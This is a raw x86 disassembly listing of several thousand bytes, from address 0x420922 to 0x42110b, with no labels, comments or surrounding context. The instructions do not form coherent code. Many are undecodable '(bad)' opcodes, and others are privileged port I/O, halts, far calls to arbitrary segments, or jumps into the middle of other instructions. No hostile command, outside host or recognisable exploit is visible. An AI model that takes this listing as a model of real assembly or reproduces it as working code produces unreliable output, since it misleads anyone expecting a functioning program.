  420922:	xchg   DWORD PTR [edx+0x2522ba35],edx
  420928:	or     BYTE PTR [edi+0x22025af3],ch
  42092e:	xor    ecx,esi
  420930:	div    DWORD PTR [eax-0x5ed67276]
  420936:	ins    BYTE PTR es:[edi],dx
  420937:	mov    cl,0x86
  420939:	(bad)  
  42093a:	mov    eax,0x12e76906
  42093f:	push   edx
  420940:	pop    ebx
  420941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420942:	sub    al,0x2b
  420944:	dec    edx
  420945:	das    
  420946:	fistp  QWORD PTR [edi-0x9]
  420949:	mov    al,ds:0x96e2ba2f
  42094e:	and    eax,0x6a5cb781
  420953:	mov    esp,0x47c58eef
  420958:	inc    edi
  420959:	sub    bl,BYTE PTR [edi-0x48b363ea]
  42095f:	jle    0x420915
  420961:	arpl   WORD PTR [ecx-0x270ec887],dx
  420967:	loop   0x42093e
  420969:	shl    bl,0xc2
  42096c:	jb     0x42094b
  42096e:	cs jno 0x42091e
  420971:	sub    al,0x9b
  420973:	dec    esi
  420974:	inc    esi
  420975:	mov    ecx,0x23d0ce55
  42097a:	mov    dh,0x6c
  42097c:	adc    eax,0x1c7ec85a
  420981:	out    dx,eax
  420982:	cmp    eax,0xe843ffce
  420987:	sub    BYTE PTR [eax+0x51],al
  42098a:	and    BYTE PTR [eax+eiz*8-0x5bc59f94],ch
  420991:	mov    al,ds:0x8e9f38aa
  420996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420997:	sub    bl,BYTE PTR [edi]
  420999:	pop    eax
  42099a:	cmp    esi,DWORD PTR ds:0xa26ffbd
  4209a0:	repz pop edi
  4209a2:	popf   
  4209a3:	xchg   edi,eax
  4209a4:	adc    al,0xc9
  4209a6:	js     0x420a0d
  4209a8:	inc    edi
  4209a9:	jne    0x420a0c
  4209ab:	cli    
  4209ac:	xchg   esp,eax
  4209ad:	jo     0x4209d2
  4209af:	aam    0xe4
  4209b1:	inc    eax
  4209b2:	cdq    
  4209b3:	or     BYTE PTR [ebp+0x2],dh
  4209b6:	pop    edx
  4209b7:	std    
  4209b8:	jae    0x4209dd
  4209ba:	(bad)  
  4209bb:	fdivr  QWORD PTR [ebp+0x67]
  4209be:	retf   0xc1ec
  4209c1:	sub    al,0xc6
  4209c3:	sbb    DWORD PTR [edx+0x49d191b],edi
  4209c9:	stos   DWORD PTR es:[edi],eax
  4209ca:	mov    cl,0x26
  4209cc:	outs   dx,DWORD PTR ds:[esi]
  4209cd:	xor    edx,ebp
  4209cf:	jle    0x420a0f
  4209d1:	fcmovnu st,st(2)
  4209d3:	sbb    DWORD PTR [edx-0x20a64b71],ebp
  4209d9:	cmp    DWORD PTR [eax-0x80],ecx
  4209dc:	push   ds
  4209dd:	mov    WORD PTR [ecx-0x12c2d259],?
  4209e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209e4:	imul   ecx,DWORD PTR ss:[esi+0x74],0x1cd17eda
  4209ec:	jmp    0xa402922f
  4209f1:	je     0x4209fe
  4209f3:	xchg   esp,eax
  4209f4:	xchg   ebx,eax
  4209f5:	cmp    dh,dl
  4209f7:	stos   DWORD PTR es:[edi],eax
  4209f8:	ins    BYTE PTR es:[edi],dx
  4209f9:	outs   dx,BYTE PTR ds:[esi]
  4209fa:	scas   al,BYTE PTR es:[edi]
  4209fb:	aad    0xfb
  4209fd:	push   esi
  4209fe:	jg     0x420a30
  420a00:	js     0x4209de
  420a02:	in     eax,dx
  420a03:	sbb    al,0xe7
  420a05:	add    al,0x2
  420a07:	loope  0x420a73
  420a09:	sub    dl,BYTE PTR [ecx+0x7a]
  420a0c:	ins    DWORD PTR es:[edi],dx
  420a0d:	dec    eax
  420a0e:	adc    DWORD PTR ds:0xf8100fe1,edi
  420a14:	adc    ax,0xecdb
  420a18:	rcl    BYTE PTR [edx+0x3d6f24f9],cl
  420a1e:	pop    esp
  420a1f:	mov    eax,DWORD PTR [ecx-0x35419f1d]
  420a25:	aas    
  420a26:	into   
  420a27:	pop    edx
  420a28:	cmc    
  420a29:	mov    bl,0x9c
  420a2b:	add    dl,BYTE PTR ss:[ebp+0xc]
  420a2f:	jne    0x420a90
  420a31:	jg     0x420a6d
  420a33:	clc    
  420a34:	cs aas 
  420a36:	push   0xdf788d88
  420a3b:	pop    es
  420a3c:	xchg   ebx,eax
  420a3d:	add    DWORD PTR [eax],eax
  420a3f:	call   0xd9420a45
  420a44:	paddq  mm6,mm5
  420a47:	push   0x6ef516c5
  420a4c:	cmp    al,0x49
  420a4e:	popa   
  420a4f:	fidivr WORD PTR [ebp-0x4d]
  420a52:	jp     0x420aac
  420a54:	and    esp,esp
  420a56:	addr16 mov fs:0x722f,al
  420a5b:	cld    
  420a5c:	imul   ecx
  420a5e:	pop    ebx
  420a5f:	cwde   
  420a60:	cld    
  420a61:	inc    ebx
  420a62:	push   ebx
  420a63:	jge    0x420ad9
  420a65:	and    BYTE PTR [eax],0xe9
  420a68:	inc    ecx
  420a69:	jmp    0x8ca7:0xccc2ab33
  420a70:	mov    esp,edi
  420a72:	inc    ebx
  420a73:	rcr    DWORD PTR [ebx-0x2f1a5d33],cl
  420a79:	sar    BYTE PTR [edi+0x23],0xba
  420a7d:	cmp    DWORD PTR [edx],ebx
  420a7f:	sbb    DWORD PTR [edi+0x5e],ebx
  420a82:	lds    ecx,FWORD PTR [esi]
  420a84:	in     al,dx
  420a85:	or     al,0x38
  420a87:	loope  0x420a3d
  420a89:	retf   
  420a8a:	mov    ds:0x24fa9a2a,eax
  420a8f:	sub    al,0x27
  420a91:	jns    0x420a37
  420a93:	xor    al,0x2b
  420a95:	nop
  420a96:	dec    ebx
  420a97:	stos   BYTE PTR es:[edi],al
  420a98:	into   
  420a99:	sbb    DWORD PTR [edi+0x5],edi
  420a9c:	into   
  420a9d:	pop    DWORD PTR [edi+0x1a]
  420aa0:	xchg   BYTE PTR [edx-0x16dbc32c],dh
  420aa6:	mov    bh,0x58
  420aa8:	das    
  420aa9:	rcl    BYTE PTR [ecx+0x78b89a9],1
  420aaf:	imul   esi,DWORD PTR [edi],0x9638df9f
  420ab5:	adc    edi,DWORD PTR [ebx+0x5803515e]
  420abb:	ins    BYTE PTR es:[edi],dx
  420abc:	fidiv  WORD PTR [ebp-0x63]
  420abf:	cmp    BYTE PTR ds:0xcaebe48d,ch
  420ac5:	dec    edi
  420ac6:	lock popf 
  420ac8:	cmp    eax,0x2e246026
  420acd:	cmp    dl,bl
  420acf:	inc    ebx
  420ad0:	fidiv  DWORD PTR [edi]
  420ad2:	lahf   
  420ad3:	ret    0x3b73
  420ad6:	shl    BYTE PTR [edx+0x61ca456b],1
  420adc:	imul   esp,DWORD PTR [ebp+0x2471ab27],0x5c
  420ae3:	dec    ebx
  420ae4:	jl     0x420aec
  420ae6:	add    eax,0x30880cf
  420aeb:	mov    esp,0x5d90823b
  420af0:	xchg   BYTE PTR [eax+ecx*4],dl
  420af3:	(bad)  
  420af5:	dec    edx
  420af6:	es fs es xor al,0xd6
  420afb:	push   ebp
  420afc:	call   0x78e4cec1
  420b01:	push   ebp
  420b02:	cld    
  420b03:	shl    DWORD PTR [edx],0xd
  420b06:	push   0x9f0eda7e
  420b0b:	ret    
  420b0c:	mov    esp,0xdd44653
  420b11:	jnp    0x420b77
  420b13:	stc    
  420b14:	ret    
  420b15:	in     eax,0x7
  420b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b18:	push   edx
  420b19:	inc    edi
  420b1a:	mov    DWORD PTR [ebx+0x7],esp
  420b1d:	cli    
  420b1e:	or     bl,BYTE PTR ds:[esi-0x199c95]
  420b25:	sub    al,ah
  420b27:	js     0x420b3b
  420b29:	mov    DWORD PTR [edx+0x5dfc3c00],ebx
  420b2f:	jno    0x420b73
  420b31:	fsub   DWORD PTR [ebx]
  420b33:	xor    DWORD PTR [bp+si],edx
  420b36:	scas   eax,DWORD PTR es:[di]
  420b38:	jns    0x420ba2
  420b3a:	pop    ebp
  420b3b:	or     al,0xcc
  420b3d:	push   es
  420b3e:	sub    eax,0x1c66f44f
  420b43:	xchg   ebx,eax
  420b44:	and    BYTE PTR [esi-0x500d5ff2],ch
  420b4a:	mov    cl,0x4b
  420b4c:	mov    esi,esp
  420b4e:	(bad)  
  420b4f:	(bad)  
  420b50:	rcl    BYTE PTR [ebx-0x3f],1
  420b53:	pop    es
  420b54:	jns    0x420b0c
  420b56:	sar    DWORD PTR [edx],1
  420b58:	mov    dh,0x4a
  420b5a:	mov    al,ds:0x2c878b7d
  420b5f:	push   0x89bdd280
  420b64:	cld    
  420b65:	shl    DWORD PTR [eax],0x68
  420b68:	mov    dh,0xa8
  420b6a:	aam    0x6a
  420b6c:	adc    cl,dh
  420b6e:	push   0x75
  420b70:	iret   
  420b71:	jmp    0x9381:0xad898cf3
  420b78:	aaa    
  420b79:	dec    eax
  420b7a:	enter  0xdcdd,0x84
  420b7e:	xor    eax,0x99bce0ff
  420b83:	sar    edi,0xdf
  420b86:	rol    BYTE PTR [eax+ebx*8-0x4ffc3421],1
  420b8d:	xlat   BYTE PTR ds:[ebx]
  420b8e:	sar    DWORD PTR [eax-0x45],cl
  420b91:	xlat   BYTE PTR ds:[ebx]
  420b92:	adc    BYTE PTR [eax],ch
  420b94:	or     BYTE PTR [ebp-0x52b24a39],ah
  420b9a:	mov    esp,0x4001ff66
  420b9f:	sbb    eax,0x70247570
  420ba4:	clc    
  420ba5:	dec    eax
  420ba6:	ds jns 0x420b78
  420ba9:	cmc    
  420baa:	mov    al,0x8d
  420bac:	mov    DWORD PTR [ecx+0x2],esp
  420baf:	ins    DWORD PTR es:[edi],dx
  420bb0:	retf   0x8d2a
  420bb3:	jle    0x420ba5
  420bb5:	push   eax
  420bb6:	fwait
  420bb7:	test   al,0x26
  420bb9:	pop    edi
  420bba:	sub    DWORD PTR [ebp+0x78a0c6e9],0x1343248c
  420bc4:	les    ebx,FWORD PTR [edx+0x745b8e5a]
  420bca:	adc    BYTE PTR ds:0x34a48f48,dh
  420bd0:	mov    edi,0xcc0ddf23
  420bd5:	fnstsw WORD PTR [esi-0x15730eb5]
  420bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bdc:	or     al,BYTE PTR [ebp+0x43]
  420bdf:	int3   
  420be0:	popf   
  420be1:	inc    eax
  420be2:	fnsave [ecx+edi*8-0x41]
  420be6:	add    BYTE PTR [ecx],dl
  420be8:	push   edx
  420be9:	fild   WORD PTR [ebx]
  420beb:	pusha  
  420bec:	ror    DWORD PTR [edi+0x224c833e],cl
  420bf2:	(bad)  
  420bf3:	jle    0x420bdd
  420bf5:	test   DWORD PTR ds:0x960892ff,ebx
  420bfb:	push   cs
  420bfc:	mov    ecx,0xa7f09bfd
  420c01:	mov    BYTE PTR [ebx+0x6fb71638],al
  420c07:	stc    
  420c08:	imul   ecx,DWORD PTR [eax],0xffffff85
  420c0b:	add    eax,0x834f462b
  420c10:	iret   
  420c11:	rol    BYTE PTR [ebp-0x23],cl
  420c14:	mov    bl,dh
  420c16:	out    0x87,eax
  420c18:	outs   dx,DWORD PTR ds:[esi]
  420c19:	cmp    al,0x21
  420c1b:	and    eax,0x8f12e8de
  420c20:	stos   BYTE PTR es:[edi],al
  420c21:	lods   eax,DWORD PTR ds:[esi]
  420c22:	cmp    ecx,DWORD PTR [esi]
  420c24:	adc    dl,al
  420c26:	addr16 xchg ecx,eax
  420c28:	cdq    
  420c29:	test   DWORD PTR [eax],edi
  420c2b:	or     BYTE PTR [ecx-0x404c48e],dh
  420c31:	dec    ecx
  420c32:	mov    bl,0x94
  420c34:	je     0x420c0d
  420c36:	call   0x94ef:0x78a100e7
  420c3d:	add    DWORD PTR [eax],eax
  420c3f:	call   0x36420c45
  420c44:	pop    DWORD PTR ds:0x28211c72
  420c4a:	add    ebp,DWORD PTR cs:[ebx-0x7a]
  420c4e:	repz sbb eax,ebp
  420c51:	pop    ecx
  420c52:	mov    esi,0xb55e66f
  420c57:	outs   dx,BYTE PTR ds:[esi]
  420c58:	mov    ebx,0xf8e6b982
  420c5d:	xor    eax,0x2460aa14
  420c62:	adc    eax,0x206e8a76
  420c67:	sar    BYTE PTR gs:[eax],1
  420c6a:	add    BYTE PTR cs:[eax+0x3f],dl
  420c6e:	(bad)  
  420c6f:	es dec ecx
  420c71:	xchg   edx,eax
  420c72:	stc    
  420c73:	neg    BYTE PTR [ebp+0x59]
  420c76:	inc    edx
  420c77:	fsubr  QWORD PTR [edx+0x26]
  420c7a:	or     DWORD PTR [ebx+0xc],ebp
  420c7d:	inc    esi
  420c7e:	xchg   edi,eax
  420c7f:	cs test ecx,eax
  420c82:	sbb    DWORD PTR [ebx-0xdaf07e7],0x33390eaf
  420c8c:	push   0x69bf8d3a
  420c91:	imul   edi,edi,0x0
  420c94:	pop    ebx
  420c95:	push   ecx
  420c96:	fst    st(7)
  420c98:	popa   
  420c99:	jl     0x420c2c
  420c9b:	xchg   ebp,eax
  420c9c:	mov    ?,WORD PTR [ebp+0x4e22582b]
  420ca2:	je     0x420c31
  420ca4:	xchg   edi,eax
  420ca5:	stc    
  420ca6:	fstp   DWORD PTR [esi]
  420ca8:	mov    ds:0x8e9ef2e4,eax
  420cad:	mov    edx,0x338705c3
  420cb2:	xchg   ecx,eax
  420cb3:	shl    dh,0xbd
  420cb6:	jp     0x420d15
  420cb8:	les    edi,FWORD PTR [edx+0x666f8030]
  420cbe:	in     eax,0x11
  420cc0:	lock mov eax,0x91501ca7
  420cc6:	in     al,dx
  420cc7:	mov    cl,0xbc
  420cc9:	mov    ds:0xcb88c2be,al
  420cce:	push   edi
  420ccf:	sbb    eax,0x2b
  420cd2:	mov    ds:0xd1f71dc2,eax
  420cd7:	push   ds
  420cd8:	sbb    eax,0x2a4dd597
  420cdd:	retf   0x744e
  420ce0:	adc    DWORD PTR [ecx-0x7411c06c],edx
  420ce6:	and    al,BYTE PTR [ebx+0x47]
  420ce9:	and    al,0xd3
  420ceb:	add    bl,BYTE PTR [ebp+0x63]
  420cee:	mov    ecx,0x2aaa1dba
  420cf3:	pushf  
  420cf4:	inc    esp
  420cf5:	fisttp DWORD PTR [ecx-0x3885380e]
  420cfb:	std    
  420cfc:	mov    ebx,0xb603e144
  420d01:	scas   al,BYTE PTR es:[edi]
  420d02:	fnop   
  420d04:	call   ebp
  420d06:	aad    0x1f
  420d08:	mov    al,ds:0x54b72cb4
  420d0d:	add    esp,DWORD PTR [esi+0x65bf6b21]
  420d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d14:	popf   
  420d15:	call   0xd578dcc2
  420d1a:	out    0xb4,al
  420d1c:	hlt    
  420d1d:	jb     0x420cd3
  420d1f:	nop
  420d20:	ins    BYTE PTR es:[edi],dx
  420d21:	fdiv   st,st(7)
  420d23:	mov    ah,0xac
  420d25:	sbb    edi,DWORD PTR [esi-0x28f782c9]
  420d2b:	shl    DWORD PTR [edi*1+0x72f83851],cl
  420d32:	mov    ebp,DWORD PTR [ebx+0xb8ce98e]
  420d38:	les    ebp,FWORD PTR [ecx]
  420d3a:	xchg   esi,eax
  420d3b:	mov    al,0x68
  420d3d:	jo     0x420d5d
  420d3f:	and    BYTE PTR [ebx],dh
  420d41:	pop    esi
  420d42:	cdq    
  420d43:	jb     0x420da7
  420d45:	shr    edi,1
  420d47:	ins    BYTE PTR es:[edi],dx
  420d48:	mov    esp,0xc2afb614
  420d4d:	xor    eax,0xe0fc5d8f
  420d52:	dec    eax
  420d53:	and    eax,0x28805cce
  420d58:	push   ds
  420d59:	jl     0x420d42
  420d5b:	dec    ecx
  420d5c:	sub    ebp,edi
  420d5e:	lds    esi,FWORD PTR [ebp+0x728d4cba]
  420d64:	mov    eax,ds:0x5d62fdfd
  420d69:	sbb    al,0xc0
  420d6b:	clc    
  420d6c:	push   cs
  420d6d:	lea    ecx,ds:0xd6636ee7
  420d73:	cli    
  420d74:	pop    esi
  420d76:	cmp    DWORD PTR [eax+0x2e],eax
  420d79:	pushf  
  420d7a:	push   0x62
  420d7c:	(bad)  
  420d7d:	xor    BYTE PTR [edi],al
  420d7f:	sbb    dl,dl
  420d81:	movzx  esi,sp
  420d84:	pop    ebp
  420d85:	pop    esp
  420d86:	jp     0x420dc4
  420d88:	xchg   edi,eax
  420d89:	mov    edx,0xf87b162a
  420d8e:	in     eax,0x51
  420d90:	scas   al,BYTE PTR es:[edi]
  420d91:	jl     0x420d4d
  420d93:	dec    edx
  420d94:	test   al,0x38
  420d96:	cli    
  420d97:	mov    ?,WORD PTR [eax-0x42]
  420d9a:	mov    ebx,0x89a76f43
  420d9f:	out    0x8a,eax
  420da1:	mov    ch,0x8a
  420da3:	scas   al,BYTE PTR es:[edi]
  420da4:	xor    BYTE PTR [esi],dl
  420da6:	les    edx,FWORD PTR [ebp+0x48]
  420da9:	sub    BYTE PTR [ecx+0x360a6db3],dh
  420daf:	ss cmp eax,0xa6ccbd59
  420db5:	cmp    ebx,DWORD PTR [esi]
  420db7:	lea    ebp,[edx]
  420db9:	pusha  
  420dba:	jnp    0x420ded
  420dbc:	loope  0x420dbf
  420dbe:	xchg   DWORD PTR [ecx+0x62],esp
  420dc1:	js     0x420dfc
  420dc3:	adc    eax,0x23d1eca5
  420dc8:	pusha  
  420dc9:	xor    al,BYTE PTR [edi+0x2c]
  420dcc:	xchg   esi,eax
  420dcd:	push   0xffffffbd
  420dcf:	aaa    
  420dd0:	sub    ecx,DWORD PTR cs:[edi+0x5315c46c]
  420dd7:	lahf   
  420dd8:	mov    esi,DWORD PTR [eax]
  420dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ddb:	pop    ds
  420ddc:	mov    eax,0xffc680c
  420de1:	xor    DWORD PTR [esi-0x71],esp
  420de4:	push   0xe6ef8fa4
  420de9:	jecxz  0x420ddf
  420deb:	inc    edi
  420dec:	cs (bad) 
  420dee:	adc    DWORD PTR [edx],edi
  420df0:	data16 (bad) [edx]
  420df3:	pop    ss
  420df4:	frstor [ecx+0x4d9e750c]
  420dfa:	dec    ecx
  420dfb:	jecxz  0x420e4c
  420dfd:	js     0x420dca
  420dff:	test   DWORD PTR [eax],eax
  420e01:	add    eax,0x9611b0b3
  420e06:	jb     0x420def
  420e08:	stos   BYTE PTR es:[edi],al
  420e09:	fcom   QWORD PTR [ecx+ebx*1-0x7e]
  420e0d:	in     eax,dx
  420e0e:	lods   eax,DWORD PTR ds:[esi]
  420e0f:	xchg   edi,eax
  420e10:	scas   eax,DWORD PTR es:[edi]
  420e11:	daa    
  420e12:	jp     0x420e22
  420e14:	shl    dl,1
  420e16:	test   BYTE PTR [edx],bl
  420e18:	push   ss
  420e19:	rol    BYTE PTR [ebp-0x68b8eb5c],0xf1
  420e20:	xor    eax,0xdc5c41e2
  420e25:	je     0x420e11
  420e27:	(bad)  
  420e28:	nop
  420e29:	push   edi
  420e2a:	and    bh,bl
  420e2c:	push   ebx
  420e2d:	mov    dl,0x4f
  420e2f:	mov    esi,0x67d3ffef
  420e34:	xchg   ecx,edi
  420e36:	adc    al,0x5a
  420e38:	push   esp
  420e39:	push   ebx
  420e3a:	jp     0x420e13
  420e3c:	xchg   esi,eax
  420e3d:	add    DWORD PTR [eax],eax
  420e3f:	call   0xcb420e45
  420e44:	xchg   ebp,eax
  420e45:	jno    0x420e88
  420e47:	pop    ecx
  420e48:	neg    edi
  420e4a:	retf   
  420e4b:	(bad)  
  420e4d:	cdq    
  420e4e:	cs pop eax
  420e50:	pop    esp
  420e51:	mov    esi,0xd1f20756
  420e56:	aas    
  420e57:	or     BYTE PTR [ecx-0x768433c],dh
  420e5d:	outs   dx,BYTE PTR ds:[esi]
  420e5e:	inc    edi
  420e5f:	or     esi,0x5c
  420e62:	or     esp,edx
  420e64:	push   es
  420e65:	sahf   
  420e66:	sub    dh,bh
  420e68:	je     0x420e30
  420e6a:	aad    0xcc
  420e6c:	(bad)  
  420e6e:	sbb    eax,0x7fdd4cde
  420e73:	stc    
  420e74:	imul   ebp,DWORD PTR [ebx],0xffffff8f
  420e77:	pop    es
  420e78:	fstp   TBYTE PTR [edx+0x32]
  420e7b:	push   ss
  420e7c:	test   ah,ah
  420e7e:	dec    esi
  420e7f:	or     al,0x6d
  420e81:	or     ebx,DWORD PTR [ebp+0x25f4963f]
  420e87:	mov    dl,0x8c
  420e89:	mov    cl,0x2e
  420e8b:	jbe    0x420eb7
  420e8d:	xchg   ecx,eax
  420e8e:	aam    0xba
  420e90:	add    edx,esi
  420e92:	cmp    ebx,DWORD PTR [ebp+ebp*2+0x7]
  420e96:	dec    ebp
  420e97:	(bad)  
  420e98:	fwait
  420e99:	xchg   edx,eax
  420e9a:	int    0x6f
  420e9c:	dec    esp
  420e9d:	inc    ebx
  420e9e:	push   eax
  420e9f:	inc    edx
  420ea0:	test   al,0xb5
  420ea2:	loop   0x420edc
  420ea4:	test   al,0x33
  420ea6:	aad    0x6c
  420ea8:	jmp    0xe9b2:0xe77ea998
  420eaf:	or     eax,0xf909e85a
  420eb4:	mov    WORD PTR [ebx],fs
  420eb6:	fwait
  420eb7:	cwde   
  420eb8:	fst    QWORD PTR [eax]
  420eba:	call   0xe663:0x7c051c97
  420ec1:	ret    
  420ec2:	adc    al,0x37
  420ec4:	mov    BYTE PTR [ebp-0x7e07157b],ah
  420eca:	mov    ch,0x89
  420ecc:	cmp    ch,ah
  420ece:	(bad)  
  420ecf:	pop    eax
  420ed0:	retf   0x18fd
  420ed3:	push   0x2dd33da
  420ed8:	sub    BYTE PTR [ecx],cl
  420eda:	xchg   edx,eax
  420edb:	out    dx,al
  420edc:	clc    
  420edd:	bound  ebx,QWORD PTR [ebx-0x2b1876b4]
  420ee3:	pop    ds
  420ee4:	icebp  
  420ee5:	dec    ecx
  420ee6:	or     BYTE PTR [ebp+0x37bcb9cb],bl
  420eec:	inc    esp
  420eed:	jnp    0x420f3e
  420eef:	jo     0x420e93
  420ef1:	push   esi
  420ef2:	les    eax,FWORD PTR [esp+ebx*2-0xe15c4a8]
  420ef9:	sti    
  420efa:	fwait
  420efb:	add    eax,0xff03cf58
  420f00:	mov    bh,0xfc
  420f02:	in     al,0x8f
  420f04:	icebp  
  420f05:	out    0xe6,al
  420f07:	call   0xf019:0x58c1a253
  420f0e:	(bad)  
  420f0f:	or     dh,BYTE PTR gs:[ecx+0x452eacb3]
  420f16:	sub    BYTE PTR [ebx-0x53],bh
  420f19:	mov    cl,0x31
  420f1b:	jmp    0x420ef9
  420f1d:	or     edi,DWORD PTR [esi-0x2a976655]
  420f23:	nop
  420f24:	sahf   
  420f25:	add    eax,DWORD PTR [edi-0x55]
  420f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f29:	clc    
  420f2a:	ret    
  420f2b:	xchg   ecx,eax
  420f2c:	into   
  420f2d:	repnz pusha 
  420f2f:	mov    eax,0x32ed493c
  420f34:	or     ah,BYTE PTR [eax-0x1d]
  420f37:	jns    0x420f8f
  420f39:	inc    ebx
  420f3a:	adc    cl,BYTE PTR ds:0x59decbcf
  420f40:	pop    ss
  420f41:	xchg   ebx,eax
  420f42:	dec    ebx
  420f43:	push   ebp
  420f44:	pop    eax
  420f45:	repnz lahf 
  420f47:	cmp    al,0x32
  420f49:	fisttp QWORD PTR [ebx+0x49]
  420f4c:	mov    ebp,0xe8217228
  420f51:	lock in eax,0x99
  420f54:	fdivr  st,st(6)
  420f56:	jp     0x420fb2
  420f58:	xchg   ecx,eax
  420f59:	jae    0x420f73
  420f5b:	(bad)  
  420f5c:	imul   ebx,edi,0x4d
  420f5f:	(bad)  
  420f60:	std    
  420f61:	test   DWORD PTR [edi+eax*4+0x22844b98],edi
  420f68:	adc    eax,0x7bd949ba
  420f6d:	clc    
  420f6e:	(bad)  
  420f6f:	mov    bl,0x52
  420f71:	sub    eax,0x98f00d2c
  420f76:	fs stos DWORD PTR es:[edi],eax
  420f78:	push   0xd982912e
  420f7d:	pop    esi
  420f7e:	xor    DWORD PTR [edx],ebp
  420f80:	sti    
  420f81:	jl     0x420feb
  420f83:	lods   eax,DWORD PTR ds:[esi]
  420f84:	adc    eax,0xba65a82d
  420f89:	mov    al,ds:0xe84de489
  420f8e:	push   ebp
  420f8f:	out    0x7b,al
  420f91:	cli    
  420f92:	xor    BYTE PTR [esi],cl
  420f94:	retf   
  420f95:	test   al,0x81
  420f97:	and    eax,0x27d85075
  420f9c:	hlt    
  420f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f9e:	push   0x39e0327a
  420fa3:	push   ecx
  420fa4:	mov    dh,0xd8
  420fa6:	dec    ebp
  420fa7:	add    bh,BYTE PTR [esi-0x6b]
  420faa:	fdiv   DWORD PTR [edi]
  420fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fad:	mov    esi,0x45c93d51
  420fb2:	sti    
  420fb3:	mov    al,ds:0xe5d4c7fa
  420fb8:	xor    DWORD PTR [edx],esi
  420fba:	and    BYTE PTR [ebx-0x5b],al
  420fbd:	fdivr  st,st(0)
  420fbf:	cmp    DWORD PTR [ebx-0x54],eax
  420fc2:	arpl   WORD PTR [esi],bx
  420fc4:	fwait
  420fc5:	sub    DWORD PTR [ebp+ebx*4+0x6ac5e4ff],ebx
  420fcc:	xchg   BYTE PTR [edx],ah
  420fce:	pop    edx
  420fcf:	xor    bh,BYTE PTR ds:[edi]
  420fd2:	jecxz  0x421032
  420fd4:	into   
  420fd5:	mov    al,0x70
  420fd7:	pop    ebx
  420fd8:	jne    0x420f79
  420fda:	iret   
  420fdb:	repnz int3 
  420fdd:	js     0x42105e
  420fdf:	ret    
  420fe0:	mov    al,BYTE PTR [edi]
  420fe2:	cwde   
  420fe3:	pop    ecx
  420fe4:	jecxz  0x420fd8
  420fe6:	sbb    al,0x9b
  420fe8:	sti    
  420fe9:	mov    edx,0xc644aa9
  420fee:	adc    DWORD PTR [edx+0x1dac96f4],eax
  420ff4:	mul    DWORD PTR [ebx]
  420ff6:	and    BYTE PTR [ecx+0x77a926d0],dl
  420ffc:	add    ebx,DWORD PTR [edx]
  420ffe:	ret    
  420fff:	adc    DWORD PTR [bp+di-0x4f],ecx
  421003:	(bad)
  421006:	hlt    
  421007:	adc    BYTE PTR [eax+ebp*1],cl
  42100a:	cmc    
  42100b:	add    eax,0x36536db4
  421010:	test   DWORD PTR [esi],ebp
  421012:	lock push ebx
  421014:	call   0x698b:0x10deba72
  42101b:	and    eax,0xdfdca63d
  421020:	adc    al,0x59
  421022:	je     0x421011
  421024:	sub    ch,bh
  421026:	inc    esp
  421027:	dec    eax
  421028:	call   0xcc99d1c
  42102d:	rcr    edx,cl
  42102f:	fcmovnu st,st(7)
  421031:	(bad)  
  421032:	pop    ebp
  421033:	retf   
  421034:	or     al,0x64
  421036:	push   ss
  421037:	ins    BYTE PTR es:[edi],dx
  421038:	out    dx,al
  421039:	jmp    0x1dacfb1
  42103e:	add    al,ch
  421040:	add    DWORD PTR [eax],eax
  421042:	add    dl,bh
  421044:	cmp    eax,0xafde3973
  421049:	ret    
  42104a:	(bad)  
  42104c:	in     eax,dx
  42104d:	imul   BYTE PTR [edi+0x27346bc]
  421053:	inc    edi
  421054:	mov    esp,0x812e62d8
  421059:	mov    edx,esi
  42105b:	hlt    
  42105c:	xor    ch,BYTE PTR [eax+0xd3ff1ae]
  421062:	ja     0x42102f
  421064:	clc    
  421065:	fnstsw WORD PTR [ecx+esi*8+0x7b]
  421069:	xchg   ebx,eax
  42106a:	sbb    al,0x8d
  42106c:	shr    eax,0x25
  42106f:	sub    DWORD PTR [eax],0xb169e6d8
  421075:	add    al,BYTE PTR [edi+ebx*4+0x7ddce858]
  42107c:	xor    DWORD PTR [ecx-0xa],esp
  42107f:	adc    al,0x24
  421081:	call   0x7129:0xb33e39b2
  421088:	std    
  421089:	ret    0x66e6
  42108c:	in     eax,dx
  42108d:	ins    DWORD PTR es:[edi],dx
  42108e:	dec    esp
  42108f:	enter  0xbd2,0xfb
  421093:	mov    ds:0xa8e1ec5c,eax
  421098:	fistp  WORD PTR [bx-0x23]
  42109c:	outs   dx,DWORD PTR ds:[esi]
  42109d:	xchg   ebx,eax
  42109e:	and    al,0xbf
  4210a0:	call   0x96db:0x18774f19
  4210a7:	fsubr  st(5),st
  4210a9:	test   eax,0xc49cffa3
  4210ae:	hlt    
  4210af:	pusha  
  4210b0:	add    dh,BYTE PTR [ebp+ebp*2+0x290fc16d]
  4210b7:	sbb    DWORD PTR [esi-0x33ca508],esi
  4210bd:	adc    DWORD PTR [ecx-0x246a9bd7],ebx
  4210c3:	xor    dh,0x26
  4210c6:	fwait
  4210c7:	jecxz  0x4210cc
  4210c9:	cmp    DWORD PTR [edx],esi
  4210cb:	adc    eax,0xae5e97c8
  4210d0:	and    DWORD PTR [edx-0x4867c559],ebx
  4210d6:	das    
  4210d7:	xchg   edx,eax
  4210d8:	idiv   BYTE PTR [edx]
  4210da:	ss mov al,0xb8
  4210dd:	stos   DWORD PTR es:[edi],eax
  4210de:	aad    0x88
  4210e0:	pusha  
  4210e1:	dec    eax
  4210e2:	inc    eax
  4210e3:	in     al,dx
  4210e4:	xor    dh,BYTE PTR [esi-0x60]
  4210e7:	mov    esi,0x4e2f702e
  4210ec:	pop    eax
  4210ed:	and    ah,BYTE PTR [ecx-0x44]
  4210f0:	dec    edi
  4210f1:	inc    edx
  4210f2:	xchg   BYTE PTR [edi+0x21685c61],dl
  4210f8:	aad    0x74
  4210fa:	rcr    BYTE PTR [ebx+ecx*2],0xf
  4210fe:	repz add BYTE PTR [ebp-0x64cf7388],bl
  421105:	mov    esp,0x8cd4a6c7
  42110a:	inc    ecx
  42110b:	and    ah,BYTE PTR [ecx]
